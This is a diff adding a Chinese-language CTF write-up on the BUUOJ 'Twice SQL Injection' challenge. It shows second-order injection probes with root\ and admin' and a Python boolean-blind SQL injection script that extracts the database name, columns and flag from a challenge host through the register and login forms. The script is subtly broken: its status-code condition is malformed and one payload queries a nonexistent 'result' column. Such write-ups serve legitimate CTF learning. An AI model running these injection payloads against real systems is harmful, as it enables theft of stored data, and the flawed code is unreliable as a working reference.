@@ -6885,6 +6885,65 @@ POST /1nD3x.php?%64%65%62%75=%61%71%75%61_%69%73_%63%75%74%65%0a&%66%69%6C%65=%6
 debu=1&file=1&shana=1&passwd=1
 ```
 
+## BUUOJ October 2019 Twice SQL Injection
+
+进去正常注册，可以看到有内容展示
+
+![image-20240228153604896](CTF.assets/image-20240228153604896.png)
+
+尝试注册用户名`root\`和密码`root\`并登录，可以看到并没有内容展示，以此可以推测出`\`导致后台SQL语句出错从而无法正确查询信息，利用这点就可以做SQL盲注
+
+![image-20240228153649474](CTF.assets/image-20240228153649474.png)
+
+再次注册`admin'`一样没有内容展示，以此推测出是使用`'`闭合
+
+![image-20240228153821249](CTF.assets/image-20240228153821249.png)
+
+在做题过程中，发现输入payload的最大值为128，脚本如下：
+
+```py
+import requests
+
+reg_url = 'http://f2acec1c-63c8-4fb8-a564-3991264d53b3.node5.buuoj.cn:81/?action=reg'
+login_url = 'http://f2acec1c-63c8-4fb8-a564-3991264d53b3.node5.buuoj.cn:81/?action=login'
+
+payload_1 = "aa' and ascii(substring((select database()),{},1)) < {}#"
+payload_2 = "1' and ascii(substring((select group_concat(result) from information_schema.tables where table_schema=database()),{},1))<{}#"
+payload_3 = "1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1))<{}#"
+payload_4 = "1' and ascii(substr((select flag from flag),{},1))<{}#"
+
+result = ''
+for i in range(1, 70):
+    max_value = 128
+    min_value = 33
+    mid_value = (max_value + min_value) // 2
+    while max_value - min_value != 1:
+        data = {
+            'username': payload_4.format(i, mid_value),
+            'password': payload_4.format(i, mid_value)
+        }
+
+        reg_response = requests.post(reg_url, data=data)
+        if 200 >= reg_response.status_code < 400:
+            login_response = requests.post(login_url, data=data)
+            if '十月' in login_response.text:
+                max_value = mid_value
+            else:
+                min_value = mid_value
+
+            mid_value = (max_value + min_value) // 2
+
+        else:
+            print(reg_response.status_code)
+
+    result += chr(mid_value)
+    print(f"[result] {result}")
+```
+
+
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
